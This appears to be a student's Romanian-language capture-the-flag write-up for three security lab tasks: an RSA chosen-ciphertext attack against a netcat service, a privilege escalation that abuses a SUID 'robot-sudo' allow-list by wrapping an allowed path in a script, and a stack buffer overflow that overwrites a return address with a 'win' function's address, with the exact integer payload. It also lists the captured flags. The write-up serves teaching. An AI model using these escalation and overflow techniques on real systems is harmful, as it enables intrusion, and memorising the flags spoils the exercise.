Task 1 - crypto-attack
SpeishFlag{A7kh8jeLkjL8JolRcEq72JFieO8MnJZ1}

Am luat in case of emergency "KLT vahlxg vbiaxkmxqm tmmtvd" si am 
aplicat rot7 si imi dadu -> "RSA chosen ciphertext attack"
"eqqmp ttt.vlrqryb.zlj txqze?s aNt4t9TdUzN" ->   https www.youtube.com watch?v dQw4w9WgXcQ   
care e rick roll, never gonna give up, gluma?)  macar e RSA, motivational music)

Avem RSA encryption unde e si n sunt parti din cheie, si am aflat valoare lor 
de la decodarea mesajului in base64

Am calculat cipher_dash conform algoritmului, si am construit noul mesaj json de
trimis catre server. Mesajul de trimis catre server il convertim in string si dupa in binar,
si il codificam in baza64 la final
Ma conectez la server cu netcat isc2023.1337.cx 11086, trimit la server, si salvez raspunsul
care e un byte string.

Decodificam sirul de bytes intr-un sir de caractere, curatand-ul cu unicode_scape,
il transformam intr-un numar ca sa putem imparti la numarul random, si am obtinut flagul
transformandu-l inapoi intr-un string.



Task 2 - linux -acl
SpeishFlag{Mg4s5pNaenHPYwrPhbrF7GmmAyhPJVlW}

Pentru inceput ma conectai la server cu cheia privata, si adaugai 
in fisierul ~/.ssh/authorized_keys cheia publica 
ssh -i ./id_rsa janitor@141.85.228.32

Am gasit in /var/.hints.txt indicii despre ce ar trbui sa fac
Am gasit in /var/local/vim/scripts/jmkr un fisier ciudat un_dos_tres.txt, nu il folosi
Am gasit in pathul /usr/local/bin fisierul robot-sudo pe care

-am vazut ce permisiuni are
ls -la
si vedem ca iamrobot e cel care a creat robot-sudo fisierul si 
are permisiunile necesare asupra acestuia

-fisierul robot-sudo are suid, set user id on execution, fisierul
se poate executa doar cu proprietarul (iamrobot)

-am dat strings pe el si am gasit pathul catre fisieul de configurare
cat /usr/src/linux/headers/angry_torvalds/r0b0t3rs.conf
allow iamrobot /var/.bin/f1n4-b055.exe
allow janitor /usr/local/bin/vacuum-control

Mergem in /var/.bin/f1n4-b055.exe si dam ltrace ./f1n4-b055.exe 2
2, fiind un argument ales aleator de noi si vedem ca face comparatie cu
strcmp("2", "991f21bd55e0f51a4e8c888e0eddd224"...)

Daca dam /var/.bin/f1n4-b055.exe  991f21bd55e0f51a4e8c888e0eddd224 apare
I will contact you when I require your cleaning services, janitor!

rezultand ca argumentul respectiv e bun pentru f1n4-b055.exe

dau ./robot-sudo I will contact you when I require your cleaning services, janitor!
Hey, no shell injection please!

./robot-sudo /usr/local/bin/vacuum-control
Okay!

Trebuie sa dau robot-sudo pe prima iamrobot /var/.bin/f1n4-b055.exe, dar trebuie sa fie de forma 
lui janitor /usr/local/bin/vacuum-control, contul la care am acces
Observ ca nu conteaza daca mai pun ceva dupa calea vacuum-control, asa ca
facem un script pe care il denumim vacuum-control2 in care punem
robot-sudo /var/.bin/f1n4-b055.exe 991f21bd55e0f51a4e8c888e0eddd224

si rulam ./robot-sudo vacuum-control2 si ne da flagul



Task 3 - binary-exploit
SpeishFlag{qCFUDQlOnxreiI63rfso1L0jWdUwlOSC}

In ghidra deschidem casino, observam ca din main se duce in loop, unde citeste,
in functia loop pe care intra main 
  while( true ) {
    iVar1 = __isoc99_scanf(&DAT_0804a023,local_b8 + uVar4);
    if (iVar1 < 1) break;
    uVar4 = uVar4 + 1;
  }

  nu se verifica ca nu a depasit limitele si putem face buffer overflow
  local_b8 ->
B8 din hexa in decimal va fi 184, iar pentru ca sunt integer fiecare va avea 
cate 4 octeti asa ca trebuie sa scriem 184/4


Ma conectai la server cu nc 141.85.228.32 10038

intram pe server, punem un nume random, sau Florin Salam pentru ceva frumos,
prima data dam x si dupa dam yes, continue pentru a vedea lucky numberul,
si dupa introducem lista de numere pe care vrem sa o rulam
ce scriu
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 134517302 2 112075
x

134517302  - adresa win in integer peste adresa de return a lui loop
2  - adresa return win ceva random
112075  - lucky number

dupa 46 de integers se afla adresa de retur a lui loop pe care o suprascriu cu 
adresa lui win in integer, dupa un numar aleator 2, pentru adresa de retur 
a lui win,  si dupa lucky_numberul respectiv pentru a-mi da flagul si dupa 
dam no ca nu mai conteaza si apare flagul


